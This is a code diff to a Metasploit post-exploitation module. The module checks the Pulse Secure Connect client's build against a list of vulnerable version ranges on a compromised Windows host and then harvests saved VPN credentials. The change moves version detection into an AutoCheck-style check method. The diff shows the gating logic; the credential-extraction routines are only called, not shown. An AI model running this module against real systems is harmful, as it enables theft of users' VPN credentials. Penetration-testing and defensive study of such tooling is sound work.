@@ -9,6 +9,7 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Windows::UserProfiles
   include Msf::Post::Windows::Priv
   include Msf::Auxiliary::Report
+  include Msf::Exploit::Remote::AutoCheck
 
   def initialize(info = {})
     super(
@@ -86,24 +87,6 @@ class MetasploitModule < Msf::Post
     return '' if len == 0
 
     return process.memory.read(addr, len)
-  end
-
-  # Parse the build information from Pulse Connect Secure client version file.
-  #
-  # @return [String] build version
-  #
-  def find_build
-    version_path = 'C:\\Program Files (x86)\\Pulse Secure\\Pulse\\versionInfo.ini'
-    begin
-      if !session.fs.file.exist?(version_path)
-        fail_with(Failure::NotVulnerable, 'Pulse Secure Connect client is not installed on this system')
-      end
-      version_data = session.fs.file.open(version_path).read.to_s
-      matches = version_data.scan(/DisplayVersion=([0-9.]*)/m)
-      return Gem::Version.new(matches[0][0])
-    rescue Rex::Post::Meterpreter::RequestError => e
-      vprint_error(e.message)
-    end
   end
 
   # Parse IVEs definitions from Pulse Secure Connect client connection store
@@ -306,14 +289,6 @@ class MetasploitModule < Msf::Post
     return creds
   end
 
-  # Array of vulnerable builds branches.
-  def vuln_builds
-    [
-      [Gem::Version.new('0.0.0'), Gem::Version.new('9.0.5')],
-      [Gem::Version.new('9.1.0'), Gem::Version.new('9.1.4')],
-    ]
-  end
-
   def gather_creds
     print_status('Running credentials acquisition.')
     ives = find_creds
@@ -368,17 +343,58 @@ class MetasploitModule < Msf::Post
     end
   end
 
-  def run
-    build = find_build
-    print_status("Target is running Pulse Secure Connect build #{build}.")
-    if vuln_builds.any? { |build_range| Gem::Version.new(build).between?(*build_range) }
-      print_good('This version is considered vulnerable.')
-    else
-      print_warning('This version is considered safe, but there might be leftovers from previous versions in the registry.')
-      if !is_system?
-        print_warning('We recommend running this script in elevated mode to obtain credentials saved by recent versions.')
+  # Array of vulnerable builds branches.
+  def vuln_builds
+    [
+      [Gem::Version.new('0.0.0'), Gem::Version.new('9.0.5')],
+      [Gem::Version.new('9.1.0'), Gem::Version.new('9.1.4')],
+    ]
+  end
+
+  # Check vulnerable state by parsing the build information from
+  # Pulse Connect Secure client version file.
+  #
+  # @return [Msf::Exploit::CheckCode] host vulnerable state
+  #
+  def check
+    version_path = 'C:\\Program Files (x86)\\Pulse Secure\\Pulse\\versionInfo.ini'
+    begin
+      if !session.fs.file.exist?(version_path)
+        print_error("Pulse Secure Connect client is not installed on this system")
+        return Msf::Exploit::CheckCode::NotVulnerable
       end
+      version_file = session.fs.file.open(version_path) rescue nil
+      if version_file.nil?
+        print_error("Cannot open Pulse Secure Connect version file.")
+        return Msf::Exploit::CheckCode::Unknown
+      end
+      version_data = version_file.read.to_s
+      matches = version_data.scan(/DisplayVersion=([0-9.]*)/m)
+      build = Gem::Version.new(matches[0][0])
+      print_status("Target is running Pulse Secure Connect build #{build}.")
+      if vuln_builds.any? { |build_range| Gem::Version.new(build).between?(*build_range) }
+        print_good("This version is considered vulnerable.")
+        return Msf::Exploit::CheckCode::Vulnerable
+      else
+        if is_system?
+          print_good("You're executing from a privileged process so this version is considered vulnerable.")
+          return Msf::Exploit::CheckCode::Vulnerable
+        else
+          print_warning("You're executing from an unprivileged process so this version is considered safe.")
+          print_warning("However, there might be leftovers from previous versions in the registry.")
+          print_warning("We recommend running this script in elevated mode to obtain credentials saved by recent versions.")
+          return Msf::Exploit::CheckCode::Appears
+        end
+      end
+    rescue Rex::Post::Meterpreter::RequestError => e
+      vprint_error(e.message)
     end
-    gather_creds
+  end
+
+  def run
+    check_code = check
+    if check_code == Msf::Exploit::CheckCode::Vulnerable || check_code == Msf::Exploit::CheckCode::Appears
+      gather_creds
+    end
   end
 end
